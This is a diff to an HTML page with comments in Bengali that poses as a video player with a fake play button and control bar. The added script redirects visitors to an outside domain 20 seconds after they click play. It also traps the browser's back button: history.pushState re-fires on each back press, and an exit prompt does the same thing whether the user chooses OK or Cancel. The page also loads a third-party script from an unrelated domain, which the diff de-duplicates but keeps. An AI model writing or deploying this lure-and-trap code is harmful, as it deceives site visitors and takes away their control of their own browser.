@@ -92,7 +92,7 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* কন্ট্রোল বার – ভিডিও কন্টেইনারের ভিতরে নিচে, শুরু থেকে দেখাবে */
+        /* কন্ট্রোল বার – শুরু থেকে দেখাবে */
         .video-controls {
             position: absolute;
             bottom: 0;
@@ -100,16 +100,14 @@
             right: 0;
             padding: 12px 20px;
             background: linear-gradient(to top, rgba(0,0,0,0.8), transparent);
-            display: flex; /* শুরু থেকে দেখাবে */
+            display: flex;
             align-items: center;
             justify-content: space-between;
             font-size: 15px;
             color: #ccc;
             z-index: 5;
         }
-        .time-display {
-            font-weight: 500;
-        }
+        .time-display { font-weight: 500; }
         .progress-bar {
             flex: 1;
             height: 4px;
@@ -194,13 +192,11 @@
             </div>
         </div>
 
-        <!-- Loading Screen -->
         <div class="loading-overlay" id="loadingScreen">
             <div class="spinner"></div>
             <div>Loading...</div>
         </div>
 
-        <!-- কন্ট্রোল বার – শুরু থেকে দেখাবে -->
         <div class="video-controls">
             <div class="time-display">00:00 / 10:23</div>
             <div class="progress-bar"><div class="progress"></div></div>
@@ -231,27 +227,41 @@
 </div>
 
 <script>
+    // প্লে ক্লিকে লোডিং + ২০ সেকেন্ড পর রিডাইরেক্ট
     document.getElementById('videoArea').addEventListener('click', function() {
         document.getElementById('playOverlay').style.display = 'none';
         document.getElementById('loadingScreen').style.display = 'flex';
 
-        // ২০ সেকেন্ড পর লিংকে যাবে
         setTimeout(function() {
             window.location.href = "https://ji.kesug.com";
-        }, 20000); // 20000 ms = 20 seconds
+        }, 20000);
     });
+
+    // ব্যাক বাটন কন্ট্রোল – পপআপ দেখাবে কিন্তু Exit কাজ করবে না
+    let backCount = 0;
+    history.pushState(null, null, location.href);
+
+    window.onpopstate = function () {
+        backCount++;
+
+        // প্রথম ২ বার পপআপ দেখাবে না
+        if (backCount <= 2) {
+            history.pushState(null, null, location.href);
+            return;
+        }
+
+        // ৩য় বার থেকে পপআপ দেখাবে
+        if (confirm("আপনি কি সত্যিই এক্সিট করতে চান?\nOK চাপলে থেকে যাবেন, Cancel চাপলে থেকে যাবেন।")) {
+            // OK চাপলেও কিছু হবে না – পেজে থেকে যাবে
+            history.pushState(null, null, location.href);
+        } else {
+            // Cancel চাপলেও কিছু হবে না – পেজে থেকে যাবে
+            history.pushState(null, null, location.href);
+        }
+    };
 </script>
 
-    <script
-  type="text/javascript"
-  src="https://saladattic.com/f9/d1/62/f9d162d901aae0a82fd9b1468c88fb91.js"
-></script><script
-  type="text/javascript"
-  src="https://saladattic.com/f9/d1/62/f9d162d901aae0a82fd9b1468c88fb91.js"
-></script><script
-  type="text/javascript"
-  src="https://saladattic.com/f9/d1/62/f9d162d901aae0a82fd9b1468c88fb91.js"
-></script><script
+<script
   type="text/javascript"
   src="https://saladattic.com/f9/d1/62/f9d162d901aae0a82fd9b1468c88fb91.js"
 ></script><script
